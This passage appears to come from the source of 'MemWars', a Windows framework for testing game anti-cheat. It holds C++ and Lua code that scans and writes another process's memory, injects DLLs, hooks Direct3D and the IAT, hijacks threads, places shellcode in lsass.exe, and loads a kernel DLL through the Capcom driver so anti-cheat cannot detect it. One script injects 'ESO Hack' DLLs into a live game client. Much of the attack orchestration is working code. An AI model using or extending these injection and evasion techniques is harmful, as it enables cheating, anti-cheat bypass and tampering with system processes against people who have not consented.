            cout << "MAX_VAL_SIZE exceeded: " << MAX_VAL_SIZE << " " << s.size() << endl;
            return FALSE;
        }
        memcpy(value, &s, s.size());
        valSize = s.size();

    } else if (choice == "8") {
        cout << "Enter the bytearray as hex values (no 0x required)" << endl;
        string s;
        cin >> s;
        vector<BYTE> bytes = HexStringToBytes(s);
        if (bytes.size() > MAX_VAL_SIZE) {
            cout << "MAX_VAL_SIZE exceeded: " << MAX_VAL_SIZE << " " << bytes.size() << endl;
            return FALSE;
        }
        memcpy(value, &bytes[0], bytes.size());
        valSize = bytes.size();
    }
    return TRUE;
}

BOOL FindValueRoutine(string attackMethod, wstring targetProcess, wstring pivotProcess) {
    if (attackMethod == "SPI") {
        cout << "Enter pivot process name" << endl;
        wcin >> pivotProcess;
    }
    ValueFinder vf;
    if (!vf.Init(attackMethod, targetProcess, pivotProcess)) {
        cout << "Init failed" << endl;
        return FALSE;
    }
    void* valBuf = malloc(MAX_VAL_SIZE);
    SIZE_T valSize;
    if (!RequestUserValueInput(valBuf, valSize)) {
        return FALSE;
    }
    vector<void*> ptrs = vf.FindValueUsingVirtualQuery(valBuf, valSize);
    while (TRUE) {
        cout << "Found pointers: " << ptrs.size() << endl
        << "(1) Show pointers" << endl
        << "(2) Enter new value and remove pointers that don't match it" << endl;
        string choice;
        cin >> choice;
        if (choice == "1") {
            for (void* ptr : ptrs) {
                cout << ptr << endl;
            }
    
        } else if (choice == "2") {
            if (!RequestUserValueInput(valBuf, valSize)) {
                return FALSE;
            }
            vf.RemoveNotMatchingValues(ptrs, valBuf, valSize);
        }
    }
    return TRUE;
}

BOOL MemoryScanRoutine(string attackMethod, wstring targetProcess, wstring pivotProcess) {
    if (attackMethod == "SPI") {
        cout << "Enter pivot process name" << endl;
        wcin >> pivotProcess;
    }
    ValueFinder vf;
    if (!vf.Init(attackMethod, targetProcess, pivotProcess)) {
        cout << "Init failed" << endl;
        return FALSE;
    }
    vf.CreateMemoryMapUsingVirtualQuery();
    return TRUE;
}

BOOL ManualProcessManipulationRoutine() {
    cout << "Choose the attack method: " << endl
    << "(1) No bypass attack" << endl
    << "(2) System Process Injection attack" << endl;
    string attackMethod;
    cin >> attackMethod;
    
    cout << "Choose the operation:" << endl
    << "(1) Find a specific value in the process" << endl
    << "(2) Make a general memory scan" << endl
    << "(3) Read a value at a target address" << endl
    << "(4) Write a value at a target address" << endl;
    string operation;
    cin >> operation;

    cout << "Enter the target process name:" << endl;
    wstring targetProcess;
    // wcin >> targetProcess;
    cin.ignore(); // ignore pending enter
    getline(wcin, targetProcess);

    if (attackMethod == "1") {
        cout << "not implemented yet" << endl;
        return FALSE;
    } else if (attackMethod == "2" && operation == "1") {
        FindValueRoutine("SPI", targetProcess);
    } else if (attackMethod == "2" && operation == "2") {
        MemoryScanRoutine("SPI", targetProcess);
    } else {
        return FALSE;
    }
    return TRUE;
}

int main() {
    cout << sizeof(WORD) << endl;
    // TODO: ValueFinder implementieren -> SPIAttackProvider Client anpassen & NoBypass Client implementieren
    cout << "Welcome to the MemWars Game Penetration Framework!" << endl;
    cout << "Choose an operation: " << endl
    << "(1) Automated penetration test of an application" << endl
    << "(2) Manual process manipulation" << endl;
    int choice;
    cin >> choice;
    if (choice == 1) {
        cout << "not implemented yet" << endl;
        return 1;
    } else if (choice == 2) {
        ManualProcessManipulationRoutine();
    }
    return 0;
}
```

`LuaInterface/ConsoleInterface/ConsoleInterface.h`:

```h
#pragma once

#include <string>
#include <vector>

using namespace std;

BOOL ManualProcessManipulationRoutine();
BOOL MemoryScanRoutine(string attackMethod, wstring targetProcess, wstring pivotProcess = L"");
BOOL FindValueRoutine(string attackMethod, wstring targetProcess, wstring pivotProcess = L"");
BOOL RequestUserValueInput(void* value, SIZE_T& valSize);
vector<BYTE> HexStringToBytes(string hexString);
```

`LuaInterface/ConsoleInterface/buildConsoleInterface.bat`:

```bat
@ECHO OFF
cl.exe /EHsc ConsoleInterface.cpp ../PenetrationRoutines/ValueFinder/ValueFinder.cpp ../PenetrationRoutines/SPIAttackProvider/Client/SPIAttackProvider.cpp ../AttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorClient.cpp ../AttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorGetHandleId.cpp  ../Core/MemWarsServicesCore.cpp ../Core/MemWarsCore.c ../AttackServices/SystemProcessInjectionAttack/spinlock.obj /link User32.lib Kernel32.lib Advapi32.lib Ntdll.lib
```

`LuaInterface/ExampleScript.lua`:

```lua
-- This example file shows how each attack method can be used

-- which attack methods shall be used?
useDllInjector = true
useDirect3DInjector = true
useIATHookInjector = true
useThreadHijacker = false
useLsassAttack = false
useKernelDLLInector = false

-- on which process should the attack methods be used?
targetProcessName = "notepad.exe"

if useDllInjector then
    print("#### Testing DLL Injection")
    injector = DLLInjector()
    injector:SetTargetDLL("C:/Users/Marius/git/MemWars/AttackServices/DLLInjectionAttack/InjectedDLL.dll")
    -- injector:SetTargetDLL("C:/Users/Marius/git/MemWars/AttackServices/NetworkEncryptionDetector/DetectEncryptionDLL.dll")
    injector:SetTargetProcessByName(targetProcessName)
    if injector:InjectDLL() then
        print("Successfully injected the DLL in the target process")
    end
    print(injector:GetAttackResults())
end

if useDirect3DInjector then
    print("#### Testing Direct3D 11 DLL Injection")
    direct3dinjector = DLLInjector()
    direct3dinjector:SetTargetDLL("C:/Users/Marius/git/MemWars/AttackServices/Direct3D11HookAttack/Direct3DHookDLL.dll")
    direct3dinjector:SetTargetProcessByName(targetProcessName)
    direct3dinjector:RequireConfirmationFile() -- this makes sure that not only LoadLibrary needs to be successful but also the hook
    if direct3dinjector:InjectDLL() then
        print("Successfully hooked the Direct 3D Function PresentHook()")
    end
    print(direct3dinjector:GetAttackResults())
end

if useIATHookInjector then
    print("#### Testing IAT Hook Injection")
    IATHookInjector = DLLInjector()
    IATHookInjector:SetTargetDLL("C:/Users/Marius/git/MemWars/AttackServices/IATHookAttack/IATHookDLL.dll")
    IATHookInjector:SetTargetProcessByName(targetProcessName)
    IATHookInjector:RequireConfirmationFile() -- this makes sure that not only LoadLibrary needs to be successful but also the hook
    if IATHookInjector:InjectDLL() then
        print("Successfully hooked the GetCurrentThreadId() Function")
    end
    print(IATHookInjector:GetAttackResults())
end

if useThreadHijacker then
    print("#### Testing thread hijacking")
    threadHijacker = ThreadHijacker()
    threadHijacker:SetTargetProcessByName(targetProcessName)
    threadHijacker:SetTimeout(10000)
    if threadHijacker:HijackThread() then
        print("Successfully hijacked the main thread of " .. targetProcessName)
    end
    print(threadHijacker:GetAttackResults())
end

function toLittleEndian(hexString)
    hexString = hexString:gsub("0x","", 1)
    local buf = ""
    for i = #hexString, 1, -1 do
        local c = hexString:sub(i,i)
        buf = buf .. c
    end
    buf = buf:gsub("(.)(.)","%2%1")
    return buf
end

if useLsassAttack then
    print("#### Installing lsass attack \n(this can take a few mintues since we wait for idling threads in lsass.exe)...")
    lsassInstaller = LsassAttackInstaller()
    if lsassInstaller:Install() then
        print("Successfully injected shellcode into lsass.exe and prepared communication via file mapping")
    end
    print(lsassInstaller:GetAttackResults())
    print("starting client...")
    lsassAttackClient = LsassAttackClient()
    if lsassAttackClient:SetTargetProcessByName(targetProcessName) then
        print("Successfully setup communication with lsass.exe")
    end
    
    -- readVal = lsassAttackClient:ReadProcessMemory("0x1c921120000", 1)
    -- print(readVal)
    -- lsassAttackClient:WriteProcessMemory("0x1c921130000", toLittleEndian("0xBE"))
    -- readVal = lsassAttackClient:ReadProcessMemory("0x1c921130000", 1)
    -- print(readVal)
    if lsassAttackClient:StartAttack() then
        print("Successfully read memory of " .. targetProcessName)
    end
    print(lsassAttackClient:GetAttackResults())
end

if useKernelDLLInector then
    print("### Testing Hidden Kernel DLL Injection")
    kernelInjector = HiddenKernelDLLInjector()
    kernelInjector:SetTargetDLL("C:/Users/Marius/git/MemWars/AttackServices/DLLInjectionAttack/InjectedDLL.dll")
    if kernelInjector:LoadDLLIntoKernel() then
        print ("Successfully loaded DLL into kernel")
    end
    -- After the DLL has been mapped into the kernel, the anti-cheat protected procress can be started
    -- this ensures that the capcom driver cannot be detected since it has been unloaded
    -- start target process here
    if kernelInjector:InjectDLLIntoProcess(targetProcessName) then
        print ("Successfully injected DLL into process")
    end
    print(kernelInjector:GetAttackResults())
end
```

`LuaInterface/FullPenetrationTest.lua`:

```lua
local colors = require("ConsoleColors")

function InjectDLL(dllPath, targetProcessName, requireConfirmationFile, timeout)
    injector = DLLInjector()
    injector:SetTargetDLL(dllPath)
    injector:SetTargetProcessByName(targetProcessName)
    injector:SetTimeout(timeout)
    if requireConfirmationFile then
        injector:RequireConfirmationFile()
    end
    local success = injector:InjectDLL()
    return success, injector:GetAttackResults()
end

function HijackThread()
    threadHijacker = ThreadHijacker()
    threadHijacker:SetTargetProcessByName(targetProcessName)
    threadHijacker:SetTimeout(10000)
    local success = threadHijacker:HijackThread()
    return success, threadHijacker:GetAttackResults()
end

function LsassAttack()
    lsassInstaller = LsassAttackInstaller()
    if lsassInstaller:Install() == false then
        return false, lsassInstaller:GetAttackResults()
    end

    lsassAttackClient = LsassAttackClient()
    if lsassAttackClient:SetTargetProcessByName(targetProcessName) == false then
        return false, lsassAttackClient:GetAttackResults()
    end
    local success = lsassAttackClient:StartAttack()
    return success, lsassAttackClient:GetAttackResults()
end

function HypervisorActivated()
    local script = [[if ($hyperv.State -eq \"Enabled\") {Write-Host "True"}else{Write-Host "False"}]]
    local pipe = io.popen("powershell -command " .. script)
    local result = pipe:read("*a")
    pipe:write("exit")
    pipe:close()
    if result == "False\n" then
        return false
    else
        return true
    end
end

function KernelDLLInject(dllPath)
    kernelInjector = HiddenKernelDLLInjector()
    kernelInjector:SetTargetDLL(dllPath)
    if kernelInjector:LoadDLLIntoKernel() == false then
        return false, kernelInjector:GetAttackResults()
    end
    -- After the DLL has been mapped into the kernel, the anti-cheat protected process can be started
    -- this ensures that the capcom driver cannot be detected since it has been unloaded
    -- start target process here
    local success = kernelInjector:InjectDLLIntoProcess(targetProcessName)
    return success, kernelInjector:GetAttackResults()
end

header = 
'===========================================\n' ..
'| MemWars Penetration Testing Framework   |\n' ..
'| https://github.com/moccajoghurt/MemWars |\n' ..
'===========================================\n'

colors.SetConsoleColor(colors.brightwhite)
io.write(header)
colors.SetConsoleColor(colors.black)
io.write("Enter the target process name: ")
targetProcessName = io.read()

localPath = "C:/Users/Marius/git/MemWars/AttackServices/"

colors.SetConsoleColor(colors.cyan)
io.write("\n[+] Testing for basic DLL-Injection...\n")
success, results = InjectDLL(localPath .. "DLLInjectionAttack/InjectedDLL.dll", targetProcessName, false, 10000)

if success then
    colors.SetConsoleColor(colors.brightgreen)
    print(results)

    colors.SetConsoleColor(colors.cyan)
    io.write("[+] Testing for Direct 3D 11 DLL-Injection...\n")
    success, results = InjectDLL(localPath .. "Direct3D11HookAttack/Direct3DHookDLL.dll", targetProcessName, true, 10000)
    if success then
        colors.SetConsoleColor(colors.brightgreen)
        io.write("[+] Successfully hooked the Direct 3D Function PresentHook()\n\n")
    else
        colors.SetConsoleColor(colors.brightred)
        io.write("[-] Could not hook the Direct 3D Function PresentHook()\n\n")
    end

    colors.SetConsoleColor(colors.cyan)
    io.write("[+] Testing for IAT Hook DLL-Injection...\n")
    success, results = InjectDLL(localPath .. "IATHookAttack/IATHookDLL.dll", targetProcessName, true, 10000)
    if success then
        colors.SetConsoleColor(colors.brightgreen)
        io.write("[+] Successfully hooked the GetCurrentThreadId() Function via IAT\n\n")
    else
        colors.SetConsoleColor(colors.brightred)
        io.write("[-] Could not hook the IAT of " .. targetProcessName .. "\n\n")
    end

    colors.SetConsoleColor(colors.cyan)
    io.write("[+] Testing for Socket Hook DLL-Injection...\n")
    success, results = InjectDLL(localPath .. "SocketHookAttack/SocketHookDLL.dll", targetProcessName, true, 10000)
    if success then
        colors.SetConsoleColor(colors.brightgreen)
        io.write("[+] Successfully read network packets of " .. targetProcessName .. "\n\n")
    else
        colors.SetConsoleColor(colors.brightred)
        io.write("[-] Could not read network packets of " .. targetProcessName .. "\n\n")
    end

else
    colors.SetConsoleColor(colors.brightred)
    print(results)
end


colors.SetConsoleColor(colors.cyan)
io.write("[+] Testing for Thread hijacking...\n")
success, results = HijackThread()
if success then
    colors.SetConsoleColor(colors.brightgreen)
    print(results)
else
    colors.SetConsoleColor(colors.brightred)
    print(results)
end

colors.SetConsoleColor(colors.cyan)
io.write("[+] Testing for Lsass attack...\n")
colors.SetConsoleColor(colors.black)
io.write("[+] Note: Installing the Lsass-Attack can take up to 3 minutes since we hijack an idling thread\n")
success, results = LsassAttack()
if success then
    colors.SetConsoleColor(colors.brightgreen)
    print(results)
else
    colors.SetConsoleColor(colors.brightred)
    print(results)
end

if HypervisorActivated() then
    colors.SetConsoleColor(colors.red)
    io.write("[-] Cannot test for Hidden Kernel DLL Injection since Hyperisor is activated.\n")
    io.write("[-] Deactivate the Hyper-V Hypervisor Service if you want to test for this attack.\n")
    io.write("[-] Using this attack with Hypervisor activated leads to BSODs.\n")
    colors.SetConsoleColor(colors.white)
    return
end

colors.SetConsoleColor(colors.cyan)
io.write("[+] Testing for Hidden Kernel DLL Injection...\n")
success, results = KernelDLLInject(localPath .. "DLLInjectionAttack/InjectedDLL.dll")
if success then
    colors.SetConsoleColor(colors.brightgreen)
    print(results)
else
    colors.SetConsoleColor(colors.brightred)
    print(results)
end

colors.SetConsoleColor(colors.white)
```

`LuaInterface/LuaInterface.cpp`:

```cpp
#include <iostream>
extern "C" {
#include "lua-5.1.5_Win64/include/lua.h"
#include "lua-5.1.5_Win64/include/lauxlib.h"
#include "lua-5.1.5_Win64/include/lualib.h"
}

#include "../libs/LuaBridge/LuaBridge.h"

#include "../PenetrationRoutines/DLLInjectionProvider/DLLInjectionProvider.h"
#include "../PenetrationRoutines/ThreadHijackProvider/ThreadHijackProvider.h"
#include "../PenetrationRoutines/LsassAttackProvider/Installer/LsassInstallProvider.h"
#include "../PenetrationRoutines/LsassAttackProvider/Client/LsassAttackProvider.h"
#include "../PenetrationRoutines/KernelDLLInjectionProvider/KernelDLLInjectionProvider.h"

using namespace luabridge;
using namespace std;

int main(int argc, char* argv[]) {

    if (argc != 2) {
        cout << "usage: LuaInterface.exe MyScript.lua" << endl;
        return 1;
    }

    if (!PathFileExists(argv[1])) {
        cout << argv[1] << " does not exist." << endl;
        return 1;
    }
    
    lua_State* L = luaL_newstate();
    luaL_openlibs(L);


    getGlobalNamespace(L)
    .beginClass<AttackProvider>("AttackProvider")
        .addConstructor<void(*) (void)>()
        .addFunction ("GetAttackResults", &AttackProvider::GetAttackResults)
    .endClass()
    .deriveClass <DLLInjectionProvider, AttackProvider>("DLLInjector")
        .addConstructor<void(*) (void)>()
        .addFunction ("SetTargetDLL", &DLLInjectionProvider::SetTargetDLL)
        .addFunction ("SetTargetProcessByName", &DLLInjectionProvider::SetTargetProcessByName)
        .addFunction ("RequireConfirmationFile", &DLLInjectionProvider::RequireConfirmationFile)
        .addFunction ("SetTimeout", &DLLInjectionProvider::SetTimeout)
        .addFunction ("InjectDLL", &DLLInjectionProvider::InjectDLL)
    .endClass()
    .deriveClass <ThreadHijackProvider, AttackProvider>("ThreadHijacker")
        .addConstructor<void(*) (void)>()
        .addFunction ("SetTargetProcessByName", &ThreadHijackProvider::SetTargetProcessByName)
        .addFunction ("SetTimeout", &ThreadHijackProvider::SetTimeout)
        .addFunction ("HijackThread", &ThreadHijackProvider::HijackThread)
    .endClass()
    .deriveClass <SPIInstallProvider, AttackProvider>("LsassAttackInstaller")
        .addConstructor<void(*) (void)>()
        .addFunction ("Install", &SPIInstallProvider::Install)
    .endClass()
    .deriveClass <SPIAttackProvider, AttackProvider>("LsassAttackClient")
        .addConstructor<void(*) (void)>()
        .addFunction ("SetTargetProcessByName", &SPIAttackProvider::Init)
        .addFunction ("ReadProcessMemory", &SPIAttackProvider::ReadProcessMemory)
        .addFunction ("WriteProcessMemory", &SPIAttackProvider::WriteProcessMemory)
        .addFunction ("GetUsableSharedMemSize", &SPIAttackProvider::GetUsableSharedMemSize)
        .addFunction ("StartAttack", &SPIAttackProvider::StartAttack)
    .endClass()
    .deriveClass <KernelDLLInjectionProvider, AttackProvider>("HiddenKernelDLLInjector")
        .addConstructor<void(*) (void)>()
        .addFunction ("SetTargetDLL", &KernelDLLInjectionProvider::SetTargetDLL)
        .addFunction ("LoadDLLIntoKernel", &KernelDLLInjectionProvider::LoadDLLIntoKernel)
        .addFunction ("InjectDLLIntoProcess", &KernelDLLInjectionProvider::InjectDLLIntoTargetProcess)
    .endClass()
    ;


    if (luaL_dofile(L, argv[1]) != 0) {
        // execution failure occured, print error
        cout << lua_tostring(L, -1) << endl;
    }

    lua_close(L);
}
```

`LuaInterface/Test.lua`:

```lua


print("#### Testing DLL Injection")
injector = DLLInjector()
-- injector:SetTargetDLL("C:/Users/Marius/git/MemWars/AttackServices/DLLInjectionAttack/InjectedDLL.dll")
injector:SetTargetDLL("C:/Users/Marius/Desktop/ESO Hack/FW1FontWrapper.dll")
injector:SetTargetProcessByName("eso64.exe")
if injector:InjectDLL() then
    print("Successfully injected the DLL in the target process")
end
injector:SetTargetDLL("C:/Users/Marius/Desktop/ESO Hack/EsoDLL.dll")
injector:SetTargetProcessByName("eso64.exe")
if injector:InjectDLL() then
    print("Successfully injected the DLL in the target process")
end
print(injector:GetAttackResults())
```

`LuaInterface/buildLuaInterface.bat`:

```bat
@ECHO OFF
cl.exe /EHsc LuaInterface.cpp ../PenetrationRoutines/DLLInjectionProvider/DLLInjectionProvider.cpp ../AttackServices/DLLInjectionAttack/Injector.cpp ../AttackServices/DLLInjectionAttack/InjectorNoShellcode.cpp ../PenetrationRoutines/ThreadHijackProvider/ThreadHijackProvider.cpp ../AttackServices/ThreadHijackAttack/ThreadHijack.cpp ../PenetrationRoutines/LsassAttackProvider/Installer/LsassInstallProvider.cpp ../AttackServices/LsassAttack/StealthyMemManipulatorInstaller.cpp ../PenetrationRoutines/LsassAttackProvider/Client/LsassAttackProvider.cpp ../AttackServices/LsassAttack/StealthyMemManipulatorClient.cpp ../AttackServices/LsassAttack/StealthyMemManipulatorGetHandleId.cpp ../AttackServices/LsassAttack/spinlock.obj ../Core/MemWarsServicesCore.cpp ../Core/MemWarsCore.c /link lua-5.1.5_Win64/liblua5.1.a Kernel32.lib Advapi32.lib Ntdll.lib Shlwapi.lib User32.lib
```

`LuaInterface/lua-5.1.5_Win64/include/lauxlib.h`:

```h
/*
** $Id: lauxlib.h,v 1.88.1.1 2007/12/27 13:02:25 roberto Exp $
** Auxiliary functions for building Lua libraries
** See Copyright Notice in lua.h
*/


#ifndef lauxlib_h
#define lauxlib_h


#include <stddef.h>
#include <stdio.h>

#include "lua.h"


#if defined(LUA_COMPAT_GETN)
LUALIB_API int (luaL_getn) (lua_State *L, int t);
LUALIB_API void (luaL_setn) (lua_State *L, int t, int n);
#else
#define luaL_getn(L,i)          ((int)lua_objlen(L, i))
#define luaL_setn(L,i,j)        ((void)0)  /* no op! */
#endif

#if defined(LUA_COMPAT_OPENLIB)
#define luaI_openlib	luaL_openlib
#endif


/* extra error code for `luaL_load' */
#define LUA_ERRFILE     (LUA_ERRERR+1)


typedef struct luaL_Reg {
  const char *name;
  lua_CFunction func;
} luaL_Reg;



LUALIB_API void (luaI_openlib) (lua_State *L, const char *libname,
                                const luaL_Reg *l, int nup);
LUALIB_API void (luaL_register) (lua_State *L, const char *libname,
                                const luaL_Reg *l);
LUALIB_API int (luaL_getmetafield) (lua_State *L, int obj, const char *e);
LUALIB_API int (luaL_callmeta) (lua_State *L, int obj, const char *e);
LUALIB_API int (luaL_typerror) (lua_State *L, int narg, const char *tname);
LUALIB_API int (luaL_argerror) (lua_State *L, int numarg, const char *extramsg);
LUALIB_API const char *(luaL_checklstring) (lua_State *L, int numArg,
                                                          size_t *l);
LUALIB_API const char *(luaL_optlstring) (lua_State *L, int numArg,
                                          const char *def, size_t *l);
LUALIB_API lua_Number (luaL_checknumber) (lua_State *L, int numArg);
LUALIB_API lua_Number (luaL_optnumber) (lua_State *L, int nArg, lua_Number def);

LUALIB_API lua_Integer (luaL_checkinteger) (lua_State *L, int numArg);
LUALIB_API lua_Integer (luaL_optinteger) (lua_State *L, int nArg,
                                          lua_Integer def);

LUALIB_API void (luaL_checkstack) (lua_State *L, int sz, const char *msg);
LUALIB_API void (luaL_checktype) (lua_State *L, int narg, int t);
LUALIB_API void (luaL_checkany) (lua_State *L, int narg);

LUALIB_API int   (luaL_newmetatable) (lua_State *L, const char *tname);
LUALIB_API void *(luaL_checkudata) (lua_State *L, int ud, const char *tname);

LUALIB_API void (luaL_where) (lua_State *L, int lvl);
LUALIB_API int (luaL_error) (lua_State *L, const char *fmt, ...);

LUALIB_API int (luaL_checkoption) (lua_State *L, int narg, const char *def,
                                   const char *const lst[]);

LUALIB_API int (luaL_ref) (lua_State *L, int t);
LUALIB_API void (luaL_unref) (lua_State *L, int t, int ref);

LUALIB_API int (luaL_loadfile) (lua_State *L, const char *filename);
LUALIB_API int (luaL_loadbuffer) (lua_State *L, const char *buff, size_t sz,
                                  const char *name);
LUALIB_API int (luaL_loadstring) (lua_State *L, const char *s);

LUALIB_API lua_State *(luaL_newstate) (void);


LUALIB_API const char *(luaL_gsub) (lua_State *L, const char *s, const char *p,
                                                  const char *r);

LUALIB_API const char *(luaL_findtable) (lua_State *L, int idx,
                                         const char *fname, int szhint);




/*
** ===============================================================
** some useful macros
** ===============================================================
*/

#define luaL_argcheck(L, cond,numarg,extramsg)	\
		((void)((cond) || luaL_argerror(L, (numarg), (extramsg))))
#define luaL_checkstring(L,n)	(luaL_checklstring(L, (n), NULL))
#define luaL_optstring(L,n,d)	(luaL_optlstring(L, (n), (d), NULL))
#define luaL_checkint(L,n)	((int)luaL_checkinteger(L, (n)))
#define luaL_optint(L,n,d)	((int)luaL_optinteger(L, (n), (d)))
#define luaL_checklong(L,n)	((long)luaL_checkinteger(L, (n)))
#define luaL_optlong(L,n,d)	((long)luaL_optinteger(L, (n), (d)))

#define luaL_typename(L,i)	lua_typename(L, lua_type(L,(i)))

#define luaL_dofile(L, fn) \
	(luaL_loadfile(L, fn) || lua_pcall(L, 0, LUA_MULTRET, 0))

#define luaL_dostring(L, s) \
	(luaL_loadstring(L, s) || lua_pcall(L, 0, LUA_MULTRET, 0))

#define luaL_getmetatable(L,n)	(lua_getfield(L, LUA_REGISTRYINDEX, (n)))

#define luaL_opt(L,f,n,d)	(lua_isnoneornil(L,(n)) ? (d) : f(L,(n)))

/*
** {======================================================
** Generic Buffer manipulation
** =======================================================
*/



typedef struct luaL_Buffer {
  char *p;			/* current position in buffer */
  int lvl;  /* number of strings in the stack (level) */
  lua_State *L;
  char buffer[LUAL_BUFFERSIZE];
} luaL_Buffer;

#define luaL_addchar(B,c) \
  ((void)((B)->p < ((B)->buffer+LUAL_BUFFERSIZE) || luaL_prepbuffer(B)), \
   (*(B)->p++ = (char)(c)))

/* compatibility only */
#define luaL_putchar(B,c)	luaL_addchar(B,c)

#define luaL_addsize(B,n)	((B)->p += (n))

LUALIB_API void (luaL_buffinit) (lua_State *L, luaL_Buffer *B);
LUALIB_API char *(luaL_prepbuffer) (luaL_Buffer *B);
LUALIB_API void (luaL_addlstring) (luaL_Buffer *B, const char *s, size_t l);
LUALIB_API void (luaL_addstring) (luaL_Buffer *B, const char *s);
LUALIB_API void (luaL_addvalue) (luaL_Buffer *B);
LUALIB_API void (luaL_pushresult) (luaL_Buffer *B);


/* }====================================================== */


/* compatibility with ref system */

/* pre-defined references */
#define LUA_NOREF       (-2)
#define LUA_REFNIL      (-1)

#define lua_ref(L,lock) ((lock) ? luaL_ref(L, LUA_REGISTRYINDEX) : \
      (lua_pushstring(L, "unlocked references are obsolete"), lua_error(L), 0))

#define lua_unref(L,ref)        luaL_unref(L, LUA_REGISTRYINDEX, (ref))

#define lua_getref(L,ref)       lua_rawgeti(L, LUA_REGISTRYINDEX, (ref))


#define luaL_reg	luaL_Reg

#endif



```

`LuaInterface/lua-5.1.5_Win64/include/lua.h`:

```h
/*
** $Id: lua.h,v 1.218.1.7 2012/01/13 20:36:20 roberto Exp $
** Lua - An Extensible Extension Language
** Lua.org, PUC-Rio, Brazil (http://www.lua.org)
** See Copyright Notice at the end of this file
*/


#ifndef lua_h
#define lua_h

#include <stdarg.h>
#include <stddef.h>


#include "luaconf.h"


#define LUA_VERSION	"Lua 5.1"
#define LUA_RELEASE	"Lua 5.1.5"
#define LUA_VERSION_NUM	501
#define LUA_COPYRIGHT	"Copyright (C) 1994-2012 Lua.org, PUC-Rio"
#define LUA_AUTHORS 	"R. Ierusalimschy, L. H. de Figueiredo & W. Celes"


/* mark for precompiled code (`<esc>Lua') */
#define	LUA_SIGNATURE	"\033Lua"

/* option for multiple returns in `lua_pcall' and `lua_call' */
#define LUA_MULTRET	(-1)


/*
** pseudo-indices
*/
#define LUA_REGISTRYINDEX	(-10000)
#define LUA_ENVIRONINDEX	(-10001)
#define LUA_GLOBALSINDEX	(-10002)
#define lua_upvalueindex(i)	(LUA_GLOBALSINDEX-(i))


/* thread status; 0 is OK */
#define LUA_YIELD	1
#define LUA_ERRRUN	2
#define LUA_ERRSYNTAX	3
#define LUA_ERRMEM	4
#define LUA_ERRERR	5


typedef struct lua_State lua_State;

typedef int (*lua_CFunction) (lua_State *L);


/*
** functions that read/write blocks when loading/dumping Lua chunks
*/
typedef const char * (*lua_Reader) (lua_State *L, void *ud, size_t *sz);

typedef int (*lua_Writer) (lua_State *L, const void* p, size_t sz, void* ud);


/*
** prototype for memory-allocation functions
*/
typedef void * (*lua_Alloc) (void *ud, void *ptr, size_t osize, size_t nsize);


/*
** basic types
*/
#define LUA_TNONE		(-1)

#define LUA_TNIL		0
#define LUA_TBOOLEAN		1
#define LUA_TLIGHTUSERDATA	2
#define LUA_TNUMBER		3
#define LUA_TSTRING		4
#define LUA_TTABLE		5
#define LUA_TFUNCTION		6
#define LUA_TUSERDATA		7
#define LUA_TTHREAD		8



/* minimum Lua stack available to a C function */
#define LUA_MINSTACK	20


/*
** generic extra include file
*/
#if defined(LUA_USER_H)
#include LUA_USER_H
#endif


/* type of numbers in Lua */
typedef LUA_NUMBER lua_Number;


/* type for integer functions */
typedef LUA_INTEGER lua_Integer;



/*
** state manipulation
*/
LUA_API lua_State *(lua_newstate) (lua_Alloc f, void *ud);
LUA_API void       (lua_close) (lua_State *L);
LUA_API lua_State *(lua_newthread) (lua_State *L);

LUA_API lua_CFunction (lua_atpanic) (lua_State *L, lua_CFunction panicf);


/*
** basic stack manipulation
*/
LUA_API int   (lua_gettop) (lua_State *L);
LUA_API void  (lua_settop) (lua_State *L, int idx);
LUA_API void  (lua_pushvalue) (lua_State *L, int idx);
LUA_API void  (lua_remove) (lua_State *L, int idx);
LUA_API void  (lua_insert) (lua_State *L, int idx);
LUA_API void  (lua_replace) (lua_State *L, int idx);
LUA_API int   (lua_checkstack) (lua_State *L, int sz);

LUA_API void  (lua_xmove) (lua_State *from, lua_State *to, int n);


/*
** access functions (stack -> C)
*/

LUA_API int             (lua_isnumber) (lua_State *L, int idx);
LUA_API int             (lua_isstring) (lua_State *L, int idx);
LUA_API int             (lua_iscfunction) (lua_State *L, int idx);
LUA_API int             (lua_isuserdata) (lua_State *L, int idx);
LUA_API int             (lua_type) (lua_State *L, int idx);
LUA_API const char     *(lua_typename) (lua_State *L, int tp);

LUA_API int            (lua_equal) (lua_State *L, int idx1, int idx2);
LUA_API int            (lua_rawequal) (lua_State *L, int idx1, int idx2);
LUA_API int            (lua_lessthan) (lua_State *L, int idx1, int idx2);

LUA_API lua_Number      (lua_tonumber) (lua_State *L, int idx);
LUA_API lua_Integer     (lua_tointeger) (lua_State *L, int idx);
LUA_API int             (lua_toboolean) (lua_State *L, int idx);
LUA_API const char     *(lua_tolstring) (lua_State *L, int idx, size_t *len);
LUA_API size_t          (lua_objlen) (lua_State *L, int idx);
LUA_API lua_CFunction   (lua_tocfunction) (lua_State *L, int idx);
LUA_API void	       *(lua_touserdata) (lua_State *L, int idx);
LUA_API lua_State      *(lua_tothread) (lua_State *L, int idx);
LUA_API const void     *(lua_topointer) (lua_State *L, int idx);


/*
** push functions (C -> stack)
*/
LUA_API void  (lua_pushnil) (lua_State *L);
LUA_API void  (lua_pushnumber) (lua_State *L, lua_Number n);
LUA_API void  (lua_pushinteger) (lua_State *L, lua_Integer n);
LUA_API void  (lua_pushlstring) (lua_State *L, const char *s, size_t l);
LUA_API void  (lua_pushstring) (lua_State *L, const char *s);
LUA_API const char *(lua_pushvfstring) (lua_State *L, const char *fmt,
                                                      va_list argp);
LUA_API const char *(lua_pushfstring) (lua_State *L, const char *fmt, ...);
LUA_API void  (lua_pushcclosure) (lua_State *L, lua_CFunction fn, int n);
LUA_API void  (lua_pushboolean) (lua_State *L, int b);
LUA_API void  (lua_pushlightuserdata) (lua_State *L, void *p);
LUA_API int   (lua_pushthread) (lua_State *L);


/*
** get functions (Lua -> stack)
*/
LUA_API void  (lua_gettable) (lua_State *L, int idx);
LUA_API void  (lua_getfield) (lua_State *L, int idx, const char *k);
LUA_API void  (lua_rawget) (lua_State *L, int idx);
LUA_API void  (lua_rawgeti) (lua_State *L, int idx, int n);
LUA_API void  (lua_createtable) (lua_State *L, int narr, int nrec);
LUA_API void *(lua_newuserdata) (lua_State *L, size_t sz);
LUA_API int   (lua_getmetatable) (lua_State *L, int objindex);
LUA_API void  (lua_getfenv) (lua_State *L, int idx);


/*
** set functions (stack -> Lua)
*/
LUA_API void  (lua_settable) (lua_State *L, int idx);
LUA_API void  (lua_setfield) (lua_State *L, int idx, const char *k);
LUA_API void  (lua_rawset) (lua_State *L, int idx);
